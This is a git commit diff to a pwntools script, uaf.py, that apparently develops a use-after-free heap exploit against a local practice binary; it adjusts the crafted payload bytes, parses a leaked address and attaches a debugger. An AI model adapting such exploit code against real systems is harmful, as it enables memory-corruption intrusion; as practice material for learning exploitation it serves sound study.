8f492e354cebeeb39511140ff3be22a083b213bd
ChoKyuWon <yyj10137@gmail.com>
2020-06-18 05:11:23 +0000

    script

--- uaf.py
+++ uaf.py
@@ -4,7 +4,7 @@ target = "use-after-free"
 
 p = process(target)
 
-payload = b"a"*16 + b"user"+b"\x00"*12 +b'\x90'*16 + b"user"+b"\x00"*12 + b'\x01'*8 + b'\x21'+b'\x00'*7
+payload = b"a"*16 + b"user"+b"\x0a"*12 +b'\x0a'*16 + b"user"+b"\x0a"*12 + b'\x01'*8 + b'\x21'+b'\x0a'*7
 
 p.recvuntil(">>>")
 p.sendline("delete-user")
@@ -16,3 +16,6 @@ print(p.recvuntil(":"))
 p.sendline(payload)
 msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
 print(del_addr, msg_addr)
+
+gdb.attach(p)
+#p.interactive()
